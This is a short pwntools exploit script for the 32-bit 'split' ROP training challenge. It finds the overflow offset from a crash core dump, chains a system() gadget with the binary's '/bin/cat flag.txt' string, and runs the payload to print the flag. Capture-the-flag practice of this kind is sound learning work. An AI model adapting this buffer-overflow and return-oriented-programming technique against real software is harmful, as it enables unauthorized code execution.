from pwn import *

#
# Context
#

e = context.binary = ELF('split32')

#
# ROP
#

# Use pwntools to find gadgets and strings
BINCAT  = p32(next(e.search(b'/bin/cat flag.txt'))) # "/bin/cat flag.txt"
SYSTEM = p32(e.symbols["usefulFunction"] + 14) # call system; <junk>

info(f'BINCAT: {hex(next(e.search(b"/bin/cat flag.txt")))}')
info(f'SYSTEM: {hex(e.symbols["usefulFunction"] + 14)}')

#
# Offset
#

io = process(e.path)

io.sendlineafter(b'> ', cyclic(0x60))
io.wait()

core = io.corefile

io.close()

offset = cyclic_find(bytes.fromhex(hex(core.eip)[2:])[::-1])
info(f'Offset: {offset}')

#
# Exploit
#

payload  = b''
payload += b'A' * (offset)
payload += SYSTEM
payload += BINCAT



with open('payload', 'wb') as fout:
    fout.write(payload)

io = process(e.path)

io.sendlineafter(b'> ', payload)
io.wait()
c = io.corefile
info(io.recvuntil(b'}').decode())
io.close()